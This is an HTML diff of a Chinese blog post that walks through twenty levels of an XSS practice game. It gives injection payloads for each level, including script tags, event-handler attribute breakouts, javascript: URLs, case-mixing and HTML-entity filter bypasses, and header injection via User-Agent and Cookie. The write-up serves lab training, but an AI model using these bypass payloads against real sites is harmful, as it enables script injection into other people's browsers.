@@ -1,12 +1,325 @@
-doctype html
-html(lang='en-us')
-  head
-    include _head
-    include _mixins
-  body(itemscope, itemtype='https://schema.org/WebPage')
-    header(itemscope, itemtype='https://schema.org/WPHeader')
-      include _header
-      .space
-    main(itemscope, itemtype='https://schema.org/Blog')
-      include _content
-    include _scripts
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="description" content="A tranquility that belongs to you only!" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    XSS闯关小游戏通过攻略 |  Tranquillity
+  </title>
+  
+  <link rel="shortcut icon" href="/feiji.ico" />
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+  
+<script src="/js/pace.min.js"></script>
+
+
+  
+
+  
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+</html>
+
+<body>
+  <div id="app">
+    <main class="content">
+      <section class="outer">
+  <article id="post-XSS闯关小游戏通过攻略" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  XSS闯关小游戏通过攻略
+</h1>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/" class="article-date">
+  <time datetime="2019-12-24T02:21:44.000Z" itemprop="datePublished">2019-12-24</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%94%BB%E7%95%A5/">攻略</a> / <a class="article-category-link" href="/categories/%E6%94%BB%E7%95%A5/XSS%E9%80%9A%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/">XSS通关小游戏</a>
+  </div>
+
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h4><p><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/1.png" alt></p>
+<pre><code>url/xss/level1.php?name=%3Cscript%3Ealert(1)%3C/script%3E</code></pre><hr>
+<h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><p><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/2.png" alt></p>
+<pre><code>1&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt; &lt;&quot;</code></pre><hr>
+<a id="more"></a>
+
+<h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/3.png" alt></p>
+<pre><code>1&#39; onmouseover=&#39;alert(1)</code></pre><hr>
+<h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h4><p><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/4.png" alt></p>
+<pre><code>1&quot; onmouseover=&quot;alert(1)</code></pre><hr>
+<h4 id="第五关（把on的替换成o-n）"><a href="#第五关（把on的替换成o-n）" class="headerlink" title="第五关（把on的替换成o_n）"></a>第五关（把on的替换成o_n）</h4><p><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/5-1.png" alt></p>
+<pre><code>1&quot;&gt; &lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;2&lt;/a&gt;</code></pre><p>插入后点击“<u>2</u>”链接<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/5-2.png" alt></p>
+<hr>
+<h4 id="第六关（把on的替换成o-n、href替换成hr-ef、script替换成scr-ipt、data替换成da-ta）"><a href="#第六关（把on的替换成o-n、href替换成hr-ef、script替换成scr-ipt、data替换成da-ta）" class="headerlink" title="第六关（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta）"></a>第六关（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta）</h4><p><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/6.png" alt><br>大小写绕过：</p>
+<pre><code>1&quot;&gt; &lt;SCript&gt;alert(1)&lt;/scripT&gt;</code></pre><hr>
+<h4 id="第七关（把on替换成空）"><a href="#第七关（把on替换成空）" class="headerlink" title="第七关（把on替换成空）"></a>第七关（把on替换成空）</h4><p><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/7.png" alt></p>
+<pre><code>1&quot; oonnmouseover=&quot;alert(1)</code></pre><hr>
+<h4 id="第八关（把on的替换成o-n、href替换成hr-ef、script替换成scr-ipt、data替换成da-ta、javascript替换成javascr-ipt，并且不能大小写绕过）"><a href="#第八关（把on的替换成o-n、href替换成hr-ef、script替换成scr-ipt、data替换成da-ta、javascript替换成javascr-ipt，并且不能大小写绕过）" class="headerlink" title="第八关（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta、javascript替换成javascr_ipt，并且不能大小写绕过）"></a>第八关（把on的替换成o_n、href替换成hr_ef、script替换成scr_ipt、data替换成da_ta、javascript替换成javascr_ipt，并且不能大小写绕过）</h4><p>利用burp suite转HTML编码，填入框中后添加友情链接，再点击友情链接。<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/8-1.png" alt><br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/8-2.png" alt></p>
+<pre><code>javascript:alert(1)
+&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29; </code></pre><hr>
+<h4 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h4><p>利用burp suite转HTML编码和http://格式的url，填入框中后添加友情链接，再点击友情链接。<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/9-1.png" alt><br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/9-2.png" alt></p>
+<pre><code>&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;/*http://a.php*/</code></pre><hr>
+<h4 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h4><p><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/10-1.png" alt><br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/10-2.png" alt></p>
+<pre><code>1&quot; onclick=&quot;alert(1)</code></pre><hr>
+<h4 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h4><h6 id="第一种方法："><a href="#第一种方法：" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/11-1.png" alt><br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/11-2.png" alt></p>
+<pre><code>onmouseover=&quot;javascript:alert(1)&quot;</code></pre><h6 id="第二种方法："><a href="#第二种方法：" class="headerlink" title="第二种方法："></a>第二种方法：</h6><hr>
+<h4 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h4><h6 id="第一种方法：跟第十一关的第一种方法一样。"><a href="#第一种方法：跟第十一关的第一种方法一样。" class="headerlink" title="第一种方法：跟第十一关的第一种方法一样。"></a>第一种方法：跟第十一关的第一种方法一样。</h6><h6 id="第二种方法：-1"><a href="#第二种方法：-1" class="headerlink" title="第二种方法："></a>第二种方法：</h6><p>由于t_ua反馈的是user-Agent的值，所以使用burp suite修改user-Agent的值后，再将t_ua的type值改为display后将鼠标移入框内，弹框。<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/12-1.png" alt><br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/12-2.png" alt></p>
+<pre><code>User-Agent: user=1&quot; onmouseover=&quot;alert(1)</code></pre><hr>
+<h4 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h4><h6 id="第一种方法：跟第十一关的第一种方法一样。-1"><a href="#第一种方法：跟第十一关的第一种方法一样。-1" class="headerlink" title="第一种方法：跟第十一关的第一种方法一样。"></a>第一种方法：跟第十一关的第一种方法一样。</h6><h6 id="第二种方法：-2"><a href="#第二种方法：-2" class="headerlink" title="第二种方法："></a>第二种方法：</h6><p>由于t_cook反馈的是cookie的值，所以使用burp suite修改cookie的值后，再将t_ua的type值改为display后将鼠标移入框内，弹框。<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/13-1.png" alt><br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/13-2.png" alt></p>
+<pre><code>Cookie: user=1&quot; onmouseover=&quot;alert(1)</code></pre><hr>
+<h4 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h4><h6 id="第一种方法：-1"><a href="#第一种方法：-1" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将iframe的src值改为：<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/14.png" alt></p>
+<pre><code>javascript:alert(1)</code></pre><h6 id="第二种方法：-3"><a href="#第二种方法：-3" class="headerlink" title="第二种方法："></a>第二种方法：</h6><hr>
+<h4 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h4><h6 id="第一种方法：-2"><a href="#第一种方法：-2" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将img标签添加onmouseover事件：<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/15-1.png" alt></p>
+<pre><code>onmouseover=&quot;javascript:alert(1)&quot;</code></pre><h6 id="第二种方法：-4"><a href="#第二种方法：-4" class="headerlink" title="第二种方法："></a>第二种方法：</h6><p><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/15-2.png" alt></p>
+<pre><code>&quot;level3.php?keyword=1&#39; onmouseover=&#39;alert(1)&quot;</code></pre><hr>
+<h4 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h4><h6 id="第一种方法：-3"><a href="#第一种方法：-3" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将img标签添加onmouseover事件：<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/16-1.png" alt></p>
+<pre><code>onmouseover=&quot;javascript:alert(1)&quot;</code></pre><h6 id="第二种方法：-5"><a href="#第二种方法：-5" class="headerlink" title="第二种方法："></a>第二种方法：</h6><hr>
+<h4 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h4><h6 id="第一种方法：-4"><a href="#第一种方法：-4" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将embed标签添加onmouseover事件：<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/17-1.png" alt></p>
+<pre><code>onmouseover=&quot;javascript:alert(1)&quot;</code></pre><h6 id="第二种方法：-6"><a href="#第二种方法：-6" class="headerlink" title="第二种方法："></a>第二种方法：</h6><hr>
+<h4 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h4><h6 id="第一种方法：-5"><a href="#第一种方法：-5" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将embed标签添加onmouseover事件：<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/18-1.png" alt></p>
+<pre><code>onmouseover=&quot;javascript:alert(1)&quot;</code></pre><h6 id="第二种方法：-7"><a href="#第二种方法：-7" class="headerlink" title="第二种方法："></a>第二种方法：</h6><hr>
+<h4 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h4><h6 id="第一种方法：-6"><a href="#第一种方法：-6" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将embed标签添加onmouseover事件：<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/19-1.png" alt></p>
+<pre><code>onmouseover=&quot;javascript:alert(1)&quot;</code></pre><h6 id="第二种方法：-8"><a href="#第二种方法：-8" class="headerlink" title="第二种方法："></a>第二种方法：</h6><hr>
+<h4 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h4><h6 id="第一种方法：-7"><a href="#第一种方法：-7" class="headerlink" title="第一种方法："></a>第一种方法：</h6><p>将embed标签添加onmouseover事件：<br><img src="/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/20-1.png" alt></p>
+<pre><code>onmouseover=&quot;javascript:alert(1)&quot;</code></pre><h6 id="第二种方法：-9"><a href="#第二种方法：-9" class="headerlink" title="第二种方法："></a>第二种方法：</h6>
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/" data-id="ck56f8ho60002nwwr0jw67q6y"
+        class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+      <a href="/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-MongoDB%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E7%95%A5/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            墨者学院-MongoDB数据库攻略
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/Sqli-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Sqli-labs通关攻略</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+  
+  
+
+  
+  
+  
+
+</article>
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul class="list-inline">
+      <li>
+        &copy;
+        2019-2020
+        GGingyii
+      </li>
+      <li>
+        
+      </li>
+    </ul>
+    <ul class="list-inline">
+      <li>
+        
+        
+        <ul class="list-inline">
+  <li>PV:<span id="busuanzi_value_page_pv"></span></li>
+  <li>UV:<span id="busuanzi_value_site_uv"></span></li>
+</ul>
+        
+      </li>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+    <div class="to_top">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+      </div>
+    </main>
+    
+    <aside class="sidebar">
+      
+        <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/feiji.png" alt="Tranquillity"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">目录</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+      </aside>
+      <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+      
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+<script>
+  var ayerConfig = {
+    mathjax: false
+  }
+</script>
+
+
+<script src="/js/ayer.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+
+
+
+<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
+  
+  
+  </div>
+</body>
+
+</html>
